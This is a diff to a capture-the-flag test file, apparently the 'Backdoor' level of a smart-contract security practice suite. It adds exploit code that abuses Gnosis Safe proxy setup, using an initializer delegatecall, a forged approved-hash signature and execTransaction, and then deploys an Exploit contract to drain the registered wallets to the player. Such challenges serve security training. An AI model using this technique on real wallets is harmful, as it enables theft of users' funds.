@@ -46,6 +46,84 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+        const myProxy = await (await ethers.getContractFactory("contracts/backdoor/Exploit.sol:MyGnosisSafe", deployer)).deploy();
+        const data = myProxy.interface.encodeFunctionData("initialize", []);
+        const initializer = masterCopy.interface.encodeFunctionData(
+            "setup",
+            [
+                [alice.address], // owners
+                1, // threashold
+                myProxy.address, // to
+                data, // data
+                "0x0000000000000000000000000000000000000000", // fallbackHandler
+                "0x0000000000000000000000000000000000000000", // paymentToken
+                0, // payment
+                "0x0000000000000000000000000000000000000000" // paymentReceiver
+            ]
+        );
+
+        const txResponse = await walletFactory.createProxyWithCallback(
+            masterCopy.address,
+            initializer,
+            0,
+            walletRegistry.address);
+        const receipt = await txResponse.wait();
+        const event = receipt.events?.find(e => e.event === 'ProxyCreation');
+
+        let proxy = event.args['proxy'];
+        const gnosisSafeJson = require("@gnosis.pm/safe-contracts/build/artifacts/contracts/GnosisSafe.sol/GnosisSafe.json");
+        const contract = new ethers.Contract(event.args['proxy'], gnosisSafeJson.abi, ethers.provider);
+        console.log(await contract.approvedHashes("0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+        "0x69520eea857ba37ecf5de9a8055acd30c7e87dbb27cbde7d1a77eb00b677efa5"));
+
+        let bytes = await contract.getTransactionHash(
+            "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+            0,
+            [],
+            0, // operation
+            0, // safeTxGas
+            0, // baseGas
+            0, // gasPrice
+            "0x0000000000000000000000000000000000000000", // gasToken
+            "0x0000000000000000000000000000000000000000", // refundReceiver
+            0
+        );
+
+        console.log(bytes);
+
+        let signature = ethers.utils.defaultAbiCoder.encode(
+            ['bytes32', 'bytes32'],
+            [
+                "0x000000000000000000000000" + "70997970c51812dc3a010c7d01b50e0d17dc79c8",
+                "0x0000000000000000000000000000000000000000000000000000000000000000",
+            ]   
+        );
+        signature += "01";
+        console.log(signature);
+
+        await contract.connect(player).execTransaction(
+            "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
+            0,
+            [],
+            0, // operation
+            0, // safeTxGas
+            0, // baseGas
+            0, // gasPrice
+            "0x0000000000000000000000000000000000000000", // gasToken
+            "0x0000000000000000000000000000000000000000", // refundReceiver
+            signature
+        );
+        */
+
+        let contract = await (await ethers.getContractFactory("./contracts/backdoor/Exploit.sol:Exploit", player)).deploy(
+            [alice.address, bob.address, charlie.address, david.address],
+            masterCopy.address,
+            walletRegistry.address,
+            walletFactory.address,
+            token.address,
+            player.address
+        );
     });
 
     after(async function () {
